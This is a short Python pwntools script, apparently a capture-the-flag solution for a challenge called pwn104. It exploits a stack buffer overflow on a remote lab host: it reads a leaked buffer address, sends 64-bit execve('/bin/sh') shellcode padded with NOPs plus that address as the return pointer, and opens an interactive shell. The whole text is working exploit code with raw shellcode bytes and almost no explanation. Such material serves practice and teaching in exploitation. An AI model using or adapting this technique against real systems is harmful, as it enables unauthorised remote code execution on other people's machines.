from pwn import *

current_ip = '10.10.49.42'

#p = process("./pwn104.pwn104")
p = remote(current_ip,9004)

# https://www.exploit-db.com/shellcodes/46907, 64bit linux shellcode
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
buffer = b'\x90' * (88 - len(shellcode))

p.recvuntil(b'at ')
address = p.recvline()
bufferaddress = p64(int(address,16))  
#print(bufferaddress)

#shellcode + buffer + adress
payload = shellcode #execve("bin/sh") 
payload += buffer  
payload += bufferaddress #the adrress that the program give to me

#print(payload)
p.sendline(payload)
p.interactive()
